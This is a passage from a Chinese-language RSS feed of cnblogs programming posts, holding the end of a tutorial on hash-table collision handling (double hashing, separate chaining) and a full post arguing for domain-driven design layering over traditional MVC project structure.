&lt;p&gt;　　顺便一提：再哈希法使用的前提必须保证数组的容量为一个质数，因为这样才能使得所有位置都被探测到；可以试试假如数组容量为15，步长为5，一个数据经过计算得到额数组下标为0，那么探测的位置应该为：（0+5）%15 = 5,、（5+5）%15 = 10，（10+5）%15 = 0，只会探测0、5、10这三个位置；但是如果数组容量为质数13，步长为5，第一个数据下标还是0，那么探测位置为：（0+5）%13 = 5,、（5+5）%13 = 10，（10+5）%13 = 2、（2+5）%13 = 7，（7+5）%13 = 12，（12+5）%13 = 4，（4+5）%13 = 9等等，可以看到每次探测的位置都不一样，可以探测到数组中所有位置只要有空的就把数据当进去即可；&lt;/p&gt;
&lt;p&gt;　　假如使用的是开放地址法，那么探测序列就用这个再哈希法生成，其实很容易！&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;5.链地址法&lt;/strong&gt;&lt;/span&gt; &lt;/p&gt;
&lt;p&gt;　　可以看到上面的开放地址法有点麻烦，需要找到探测序列真的是日了狗了，麻烦的我都不想看了，如果可以不用这么麻烦那该多好呀，ok，那就用链地址法吧！就类似下面这样的结构，原始的数组中不直接保存数据，每个位置只是保存第一个数据的引用，通过该位置第一个引用就可以取到后面所有的数据！如果链表太长遍历起来就比较费劲，可以转为红黑树效率就高了很多；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190521110521180-1894926834.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　这里其实没什么好说的，因为数组和链表的使用很熟悉了，没什么特别难的东西，基本逻辑：只需要新建一个MyHashTable的类，这个类中有几个属性：一个数组，一个int类型的属性标识数组真实容量的大小；最好有个节点类为静态内部类，这个静态内部类中实现了对链表的增删改查的操作；然后在MyHashTable类中写一个哈希函数的方法，根据这个哈希函数得出来的数组下标，最后对数组的增删改查了！&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;6.总结&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　哈希表其实还可以用在外部存储中，也就是硬盘中，有兴趣的可以看看，不过我感觉到这里就差不多了！其实哈希表的内容没多少吧，最主要的就是哈希函数的选取，选择一个好的哈希函数可以使得我们的哈希表的效率更高！然后就是数组中存数据的方式，可以直接在数组中存数据，也可以在数组中存节点的引用，其实吧，知不知道二维数组？在我们这个数组中每个位置存的是另外一个数组的引用，这样其实也行，由于扩展起来很困难，使用链表比使用二维数组好。。。&lt;/p&gt;
</description>
<pubDate>Tue, 21 May 2019 14:58:00 +0000</pubDate>
<dc:creator>java小新人</dc:creator>
<og:description>树的结构说得差不多了，现在我们来说说一种数据结构叫做哈希表（hash table），哈希表有是干什么用的呢？我们知道树的操作的时间复杂度通常为O（logN），那有没有更快的数据结构？当然有，那就是哈希</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wyq1995/p/10890349.html</dc:identifier>
</item>
<item>
<title>可落地的DDD的(2)-为什么说MVC工程架构已经过时 - stoneFang</title>
<link>http://www.cnblogs.com/stoneFang/p/10903008.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/stoneFang/p/10903008.html</guid>
<description>&lt;p&gt;mvc是一种软件设计模式，最早由Trygve Reenskaug在1978年提出，他有效的解决了表示层，控制器层，逻辑层的代码混合在一起的问题，很好的做到了职责分离。但是在实际的编码实践过程中，你会发现这个模式随着业务的扩展，变的逻辑混乱，代码重合度很高。这里提出借鉴DDD思想的一种新的工程结构&lt;/p&gt;

&lt;p&gt;通常一个前后端分离的系统，后端工程系统结构图通常下面这样&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/201905192015096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  1. 四层 controller/service/manager/mapper

  2. 不可以同级调用

  3. 上级可以知晓下级，下级不可知晓上级，也就是bean的转化放在上级&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个分层结构职责分离是按照纵向切分的&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  1. 资源服务层repository是面向DB编程

  2. service层是面向前端页面编程。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是说，对于某一块的业务，他没有将逻辑抽象到一起，他只是将一次request按照纵向切分了。没有进行横向的业务切分。&lt;br/&gt;这样将会导致的问题&lt;br/&gt;&lt;strong&gt;职责分散，逻辑重复度高&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;bean的创建太随意，基本就是一个需求对应一些dto, vo，query bean&lt;/li&gt;
&lt;li&gt;不同开发者对于同一个领域的东西有不同的bean，同一个开发者对于相同逻辑的bean，过了几个月，又定义出一个差不多的bean&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;没有边界&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;根本没有上下文/边界的概念，比如说店铺会和用户有交互，订单会和用户有交互，通常在DB存储时只会存关联id，然后需要去取对应的名称，其他属性信息。这些信息的获取，有些开发在manager层操作，然后将属性定义到了店铺相关的DTO中;有些放在了service层做。controller/service/manager各个层次都可以调用，没有任何约束。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;mvc的演进&quot;&gt;mvc的演进&lt;/h2&gt;
&lt;p&gt;按照上述的说明，在一个单体服务中，随着业务的不断迭代，可能会发生什么严重的问题。&lt;/p&gt;
&lt;p&gt;举几个真实鲜活的例子&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分库分表的例子&lt;/strong&gt;&lt;br/&gt;实体A是我们业务中的一个基础的重要的实体，对应的数据表tableA,一开始业务很简单，只有1个服务，在这个服务里面调用。后来业务扩张了，有十几个服务了，然后十几个服务直接查这个tableA。tableA也扩张成为了tableA,tableB,tableC。有些人觉得代码重复度高了，将mapper/manager层拆成共通的部分打成一个jar包，然后各个微服务中引入这个jar。业务变得更加复杂了，服务扩展到几十个了，tableA数据也有几千万了，这时候要做分库分表了，怎么整。&lt;/p&gt;
&lt;p&gt;最后花了差不多1年，涉及十几个团队，才把这个mapper/manager调用改掉，然后做分库分表。&lt;/p&gt;
&lt;p&gt;有人可能觉得这个只要在服务拆分时，避免直接调用就可以了，那再举个其他类型的例子。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用户等级的例子&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户的等级，用户的分级是很复杂的，不同的业务阶段有这个不同的定义。比如一开始定义一个字段叫grade的代表用户等级。&lt;br/&gt;然后各个业务都在查这个表的字段grade进行判断，然后产品需要改了，增加了判断必须同时要达到什么条件才能称作等级x。这时候你又得满世界的改了。&lt;/p&gt;
&lt;h2 id=&quot;ddd的工程架构&quot;&gt;DDD的工程架构&lt;/h2&gt;
&lt;p&gt;那如何运用DDD的思想进行改造呢&lt;br/&gt;&lt;strong&gt;核心思想：封装领域内的逻辑，统一对外暴露的入口，防止业务逻辑泄露。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190521224831685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在mvc纵向切分的基础上，增加一层领域的横向切分&lt;/li&gt;
&lt;li&gt;同一个工程里面，领域之间的调用只能通过domainService,这样可以屏蔽领域内的数据库是如何持久化的，业务逻辑是如何判断的、算法是如何实现的。&lt;br/&gt;service之间可以直接调用。&lt;/li&gt;
&lt;li&gt;领域内还是纵向切分，安装mvc分层结构。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面的只是一个草图，我们真实的结构图比这要稍微复杂些。领域内会区分领域对象，领域服务，基础设施层。这样在领域内进行指责分离，不过从实际的执行过程中领域内的比较细节，执行起来ROI比较低，推荐大家可以先按这套执行。&lt;/p&gt;
&lt;p&gt;画外音：估计有些程序员看到这个工程结构变化呵呵一笑，觉得没多大价值，没什么改变必要。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;这种工程的结构划分从提出来的到真正被我们团队成员接受的时间周期差不多是8个月。&lt;br/&gt;原因大概是这么几类&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;引入新的分层，太复杂了，增加了代码复杂度&lt;/li&gt;
&lt;li&gt;我这块业务很简单，CRUD就行了，没涉及到服务之间的交互。直接mvc一条道走到黑就可以。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;如果你看这篇文章也是这种感受，不妨花点时间看下你们业务的代码，看看重复度有多高，看看逻辑有多散乱。你就会明白。&lt;/p&gt;
&lt;h3 id=&quot;ddd工程的演进&quot;&gt;DDD工程的演进&lt;/h3&gt;
&lt;p&gt;DDD工程的演进也就是服务的拆分了，放到下期讲。&lt;/p&gt;

&lt;p&gt;很多DDD的文章都在说传统的编程方式是面试数据库编程，导致对象中只有getter,setter，也就是贫血模型，贫血模型是没有业务逻辑，面向过程设计，不符合面向对象设计原则。&lt;/p&gt;
&lt;p&gt;对于这个结论我是同意的，但是对于造成的原因不是很同意。个人认为造成这个原因的主要原因还是在于长期以来的MVC这种模式只有纵向切分导致。如果结合横向切分，有没有DDD也无所谓。这里再引用一下&lt;a href=&quot;https://www.infoq.cn/article/star-driven-approaches&quot;&gt;驱动方法不能改变任何事情&lt;/a&gt;这段话，如果你能深入理解职责、封装。并随着业务的迭代，不断的重构你的代码，那么你不需要什么DDD,或者其他方法论。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;使用职责、封装和组合；&lt;br/&gt;以接口的视角思考，即“人们如何使用我的组件？”；&lt;br/&gt;使用相关技术写好代码，包括可读性、信息性、简洁、自描述，尽量避免显式地使用模式；&lt;br/&gt;有能力回答特定业务的“本质”；“本质”是一个模型，但不意味着类和方法，它意味着回答问题“这个业务如何真正地工作？”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因为这些约束，都是强迫你去思考，去做职责的思考，去做模块的封装。如果你/你团队成员已经领会其中的道理并很好的运用，还需要这些条条框框干吗呢？&lt;/p&gt;
&lt;p&gt;下一篇领域与微服务划分，欲知后事如何，请听下回分解。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;相关阅读&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/stoneFang/p/10888630.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/stoneFang/p/10888630.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关注【方丈的寺院】，第一时间收到文章的更新，与方丈一起开始技术修行之路&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190418000000125.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 21 May 2019 14:51:00 +0000</pubDate>
<dc:creator>stoneFang</dc:creator>
<og:description>摘要 mvc是一种软件设计模式，最早由Trygve Reenskaug在1978年提出，他有效的解决了表示层，控制器层，逻辑层的代码混合在一起的问题，很好的做到了职责分离。但是在实际的编码实践过程中，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/stoneFang/p/10903008.html</dc:identifier>
</item>
</channel>
</rss>